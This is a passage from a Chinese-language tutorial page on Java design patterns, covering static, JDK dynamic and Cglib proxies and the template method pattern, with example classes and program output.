class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.staticproxy;<br><br><span class="hljs-comment">//代理对象,静态代理</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TeacherDaoProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ITeacherDao</span>&#123;<br>   <br>   <span class="hljs-keyword">private</span> ITeacherDao target; <span class="hljs-comment">// 目标对象，通过接口来聚合</span><br>   <br>   <br>   <span class="hljs-comment">//构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">TeacherDaoProxy</span><span class="hljs-params">(ITeacherDao target)</span> &#123;<br>      <span class="hljs-built_in">this</span>.target = target;<br>   &#125;<br><br><br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">teach</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;开始代理  完成某些操作。。。。。 &quot;</span>);<span class="hljs-comment">//方法</span><br>      target.teach();<br>      System.out.println(<span class="hljs-string">&quot;提交。。。。。&quot;</span>);<span class="hljs-comment">//方法</span><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.staticproxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//创建目标对象(被代理对象)</span><br>      <span class="hljs-type">TeacherDao</span> <span class="hljs-variable">teacherDao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TeacherDao</span>();<br>      <br>      <span class="hljs-comment">//创建代理对象, 同时将被代理对象传递给代理对象</span><br>      <span class="hljs-type">TeacherDaoProxy</span> <span class="hljs-variable">teacherDaoProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TeacherDaoProxy</span>(teacherDao);<br>      <br>      <span class="hljs-comment">//通过代理对象，调用到被代理对象的方法</span><br>      <span class="hljs-comment">//即：执行的是代理对象的方法，代理对象再去调用目标对象的方法 </span><br>      teacherDaoProxy.teach();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">开始代理  完成某些操作。。。。。 <br> 老师授课中  。。。。。<br>提交。。。。。<br><br></code></pre></td></tr></table></figure><blockquote><p>静态代理优缺点</p></blockquote><ol><li><p>优点：在不修改目标对象的功能前提下, 能通过代理对象对目标功能扩展</p></li><li><p>缺点：因为代理对象需要与目标对象实现一样的接口,所以会有很多代理类</p></li><li><p>一旦接口增加方法,目标对象与代理对象都要维护</p></li></ol><h3 id="动态代理"><a class="markdownIt-Anchor" href="#动态代理"></a> 动态代理</h3><blockquote><p>动态代理模式的基本介绍</p></blockquote><ol><li>代理对象,不需要实现接口，但是目标对象要实现接口，否则不能用动态代理</li><li>代理对象的生成，是利用 JDK 的 API，动态的在内存中构建代理对象</li><li>动态代理也叫做：JDK 代理、接口代理</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103144507077.png" alt="image-20230103144507077" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.dynamic;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//创建目标对象</span><br>      <span class="hljs-type">ITeacherDao</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TeacherDao</span>();<br>      <br>      <span class="hljs-comment">//给目标对象，创建代理对象, 可以转成 ITeacherDao</span><br>      <span class="hljs-type">ITeacherDao</span> <span class="hljs-variable">proxyInstance</span> <span class="hljs-operator">=</span> (ITeacherDao)<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyFactory</span>(target).getProxyInstance();<br>   <br>      <span class="hljs-comment">// proxyInstance=class com.sun.proxy.$Proxy0 内存中动态生成了代理对象</span><br>      System.out.println(<span class="hljs-string">&quot;proxyInstance=&quot;</span> + proxyInstance.getClass());<br>      <br>      <span class="hljs-comment">//通过代理对象，调用目标对象的方法</span><br>      proxyInstance.teach();<br>      <br>      proxyInstance.sayHello(<span class="hljs-string">&quot; tom &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ITeacherDao.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.dynamic;<br><br><span class="hljs-comment">//接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ITeacherDao</span> &#123;<br><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">teach</span><span class="hljs-params">()</span>; <span class="hljs-comment">// 授课方法</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ProxyFactory.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.dynamic;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyFactory</span> &#123;<br><br>   <span class="hljs-comment">//维护一个目标对象 , Object</span><br>   <span class="hljs-keyword">private</span> Object target;<br><br>   <span class="hljs-comment">//构造器 ， 对target 进行初始化</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ProxyFactory</span><span class="hljs-params">(Object target)</span> &#123;<br>      <br>      <span class="hljs-built_in">this</span>.target = target;<br>   &#125; <br>   <br>   <span class="hljs-comment">//给目标对象 生成一个代理对象</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span> &#123;<br>      <br>      <span class="hljs-comment">//说明</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">       *  public static Object newProxyInstance(ClassLoader loader,</span><br><span class="hljs-comment">                                          Class&lt;?&gt;[] interfaces,</span><br><span class="hljs-comment">                                          InvocationHandler h)</span><br><span class="hljs-comment">                                          </span><br><span class="hljs-comment">            //1. ClassLoader loader ： 指定当前目标对象使用的类加载器, 获取加载器的方法固定</span><br><span class="hljs-comment">            //2. Class&lt;?&gt;[] interfaces: 目标对象实现的接口类型，使用泛型方法确认类型</span><br><span class="hljs-comment">            //3. InvocationHandler h : 事情处理，执行目标对象的方法时，会触发事情处理器方法, 会把当前执行的目标对象方法作为参数传入</span><br><span class="hljs-comment">       */</span><br>      <span class="hljs-keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), <br>            target.getClass().getInterfaces(), <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvocationHandler</span>() &#123;<br>               <br>               <span class="hljs-meta">@Override</span><br>               <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>                  <span class="hljs-comment">// TODO Auto-generated method stub</span><br>                  System.out.println(<span class="hljs-string">&quot;JDK代理开始~~&quot;</span>);<br>                  <span class="hljs-comment">//反射机制调用目标对象的方法</span><br>                  <span class="hljs-type">Object</span> <span class="hljs-variable">returnVal</span> <span class="hljs-operator">=</span> method.invoke(target, args);<br>                  System.out.println(<span class="hljs-string">&quot;JDK代理提交&quot;</span>);<br>                  <span class="hljs-keyword">return</span> returnVal;<br>               &#125;<br>            &#125;); <br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>TeacherDao.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.dynamic;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TeacherDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ITeacherDao</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">teach</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 老师授课中.... &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;hello &quot;</span> + name);<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">proxyInstance=class com.sun.proxy.$Proxy0<br><span class="hljs-keyword">JDK代理开始~~</span><br><span class="hljs-keyword"></span> 老师授课中.... <br><span class="hljs-keyword">JDK代理提交</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JDK代理开始~~</span><br><span class="hljs-keyword"></span>hello  tom <br><span class="hljs-keyword">JDK代理提交</span><br></code></pre></td></tr></table></figure><h3 id="cglib-代理"><a class="markdownIt-Anchor" href="#cglib-代理"></a> Cglib 代理</h3><blockquote><p>Cglib 代理模式的基本介绍</p></blockquote><ol><li><p>静态代理和 JDK 代理模式都要求目标对象是实现一个接口,但是有时候目标对象只是一个<strong>单独的对象</strong>,并没<strong>有实****现任何的接口</strong>,这个时候可使用目标对象子类来实现代理-这就是 <strong>Cglib 代理</strong></p></li><li><p>Cglib代理也叫作**子类代理,**它是在内存中构建一个子类对象从而实现对目标对象功能扩展, 有些书也将Cglib代理归属到动态代理。</p></li><li><p>Cglib 是一个强大的高性能的代码生成包,它可以在运行期扩展 java 类与实现 java 接口.它广泛的被许多 AOP 的框架使用,例如 Spring AOP，实现方法拦截</p></li><li><p>在 AOP 编程中如何选择代理模式：</p><ul><li><p>目标对象需要实现接口，用 JDK 代理</p></li><li><p>目标对象不需要实现接口，用 Cglib 代理</p></li></ul></li><li><p>Cglib 包的底层是通过使用字节码处理框架 ASM 来转换字节码并生成新的类</p></li></ol><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.cglib;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//创建目标对象</span><br>      <span class="hljs-type">TeacherDao</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TeacherDao</span>();<br>      <span class="hljs-comment">//获取到代理对象，并且将目标对象传递给代理对象</span><br>      <span class="hljs-type">TeacherDao</span> <span class="hljs-variable">proxyInstance</span> <span class="hljs-operator">=</span> (TeacherDao)<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyFactory</span>(target).getProxyInstance();<br><br>      <span class="hljs-comment">//执行代理对象的方法，触发intecept 方法，从而实现 对目标对象的调用</span><br>      <span class="hljs-type">String</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> proxyInstance.teach();<br>      System.out.println(<span class="hljs-string">&quot;res=&quot;</span> + res);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ProxyFactory.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.cglib;<br><br><br><br><br><span class="hljs-keyword">import</span> net.sf.cglib.proxy.Enhancer;<br><span class="hljs-keyword">import</span> net.sf.cglib.proxy.MethodInterceptor;<br><span class="hljs-keyword">import</span> net.sf.cglib.proxy.MethodProxy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MethodInterceptor</span> &#123;<br><br>   <span class="hljs-comment">//维护一个目标对象</span><br>   <span class="hljs-keyword">private</span> Object target;<br>   <br>   <span class="hljs-comment">//构造器，传入一个被代理的对象</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ProxyFactory</span><span class="hljs-params">(Object target)</span> &#123;<br>      <span class="hljs-built_in">this</span>.target = target;<br>   &#125;<br><br>   <span class="hljs-comment">//返回一个代理对象:  是 target 对象的代理对象</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">//1. 创建一个工具类</span><br>      <span class="hljs-type">Enhancer</span> <span class="hljs-variable">enhancer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Enhancer</span>();<br>      <span class="hljs-comment">//2. 设置父类</span><br>      enhancer.setSuperclass(target.getClass());<br>      <span class="hljs-comment">//3. 设置回调函数</span><br>      enhancer.setCallback(<span class="hljs-built_in">this</span>);<br>      <span class="hljs-comment">//4. 创建子类对象，即代理对象</span><br>      <span class="hljs-keyword">return</span> enhancer.create();<br>      <br>   &#125;<br>   <br><br>   <span class="hljs-comment">//重写  intercept 方法，会调用目标对象的方法</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">intercept</span><span class="hljs-params">(Object arg0, Method method, Object[] args, MethodProxy arg3)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;Cglib代理模式 ~~ 开始&quot;</span>);<br>      <span class="hljs-type">Object</span> <span class="hljs-variable">returnVal</span> <span class="hljs-operator">=</span> method.invoke(target, args);<br>      System.out.println(<span class="hljs-string">&quot;Cglib代理模式 ~~ 提交&quot;</span>);<br>      <span class="hljs-keyword">return</span> returnVal;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>TeacherDao.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.cglib;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TeacherDao</span> &#123;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">teach</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; 老师授课中  ， 我是cglib代理，不需要实现接口 &quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Cglib代理模式 ~~ 开始<br> 老师授课中  ， 我是cglib代理，不需要实现接口 <br>Cglib代理模式 ~~ 提交<br><span class="hljs-attribute">res</span>=hello<br></code></pre></td></tr></table></figure><h1 id="模板模式"><a class="markdownIt-Anchor" href="#模板模式"></a> <mark>模板模式</mark></h1><p>在模板模式（TemplatePattern）中，一个抽象类公开定义了执行它的方法的方式/模板。它的子类可以按需要重写方法实现，但调用将以抽象类中定义的方式进行。这种类型的设计模式属于行为型模式。</p><h2 id="介绍-12"><a class="markdownIt-Anchor" href="#介绍-12"></a> 介绍</h2><p><strong>意图：</strong> 定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。模板方法使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。</p><p><strong>主要解决：</strong> 一些方法通用，却在每一个子类都重新写了这一方法。</p><p><strong>何时使用：</strong> 有一些通用的方法。</p><p><strong>如何解决：</strong> 将这些通用算法抽象出来。</p><p><strong>关键代码：</strong> 在抽象类实现，其他步骤在子类实现。</p><p><strong>应用实例：</strong> 1、在造房子的时候，地基、走线、水管都一样，只有在建筑的后期才有加壁橱加栅栏等差异。 2、西游记里面菩萨定好的 81难，这就是一个顶层的逻辑骨架。 3、spring 中对 Hibernate 的支持，将一些已经定好的方法封装起来，比如开启事务、获取 Session、关闭Session 等，程序员不重复写那些已经规范好的代码，直接丢一个实体就可以保存。</p><p><strong>优点：</strong> 1、封装不变部分，扩展可变部分。 2、提取公共代码，便于维护。 3、行为由父类控制，子类实现。</p><p><strong>缺点：</strong> 每一个不同的实现都需要一个子类来实现，导致类的个数增加，使得系统更加庞大。</p><p><strong>使用场景：</strong> 1、有多个子类共有的方法，且逻辑相同。 2、重要的、复杂的方法，可以考虑作为模板方法。</p><p><strong>注意事项：</strong> 为防止恶意操作，一般模板方法都加上 final 关键词。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103150422044.png" alt="image-20230103150422044" /></p><p>对原理类图的说明-即(模板方法模式的角色及职责)</p><ol><li><p>AbstractClass 抽象类， 类中实现了模板方法(template)，定义了算法的骨架，具体子类需要去实现 其它的抽象方法 operationr2,3,4</p></li><li><p>ConcreteClass 实现抽象方法 operationr2,3,4, 以完成算法中特点子类的步骤</p></li></ol><h2 id="实现-10"><a class="markdownIt-Anchor" href="#实现-10"></a> 实现</h2><ol><li>应用实例要求</li></ol><ul><li>编写制作豆浆的程序，说明如下:</li><li>制作豆浆的流程 选材—&gt;添加配料—&gt;浸泡—&gt;放到豆浆机打碎</li><li>通过添加不同的配料，可以制作出不同口味的豆浆</li><li>选材、浸泡和放到豆浆机打碎这几个步骤对于制作每种口味的豆浆都是一样的(红豆、花生豆浆。。。)</li></ul><ol start="2"><li>思路分析和图解(类图)</li></ol><h3 id="模板方法模式一"><a class="markdownIt-Anchor" href="#模板方法模式一"></a> 模板方法模式一</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103151032471.png" alt="image-20230103151032471" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//制作红豆豆浆</span><br>      <br>      System.out.println(<span class="hljs-string">&quot;----制作红豆豆浆----&quot;</span>);<br>      <span class="hljs-type">SoyaMilk</span> <span class="hljs-variable">redBeanSoyaMilk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedBeanSoyaMilk</span>();<br>      redBeanSoyaMilk.make();<br>      <br>      System.out.println(<span class="hljs-string">&quot;----制作花生豆浆----&quot;</span>);<br>      <span class="hljs-type">SoyaMilk</span> <span class="hljs-variable">peanutSoyaMilk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PeanutSoyaMilk</span>();<br>      peanutSoyaMilk.make();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PeanutSoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PeanutSoyaMilk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 加入上好的花生 &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>RedBeanSoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedBeanSoyaMilk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 加入上好的红豆 &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>SoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template;<br><br><span class="hljs-comment">//抽象类，表示豆浆</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-comment">//模板方法, make , 模板方法可以做成final , 不让子类去覆盖.</span><br>   <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">make</span><span class="hljs-params">()</span> &#123;<br>      <br>      select(); <br>      addCondiments();<br>      soak();<br>      beat();<br>      <br>   &#125;<br>   <br>   <span class="hljs-comment">//选材料</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;第一步：选择好的新鲜黄豆  &quot;</span>);<br>   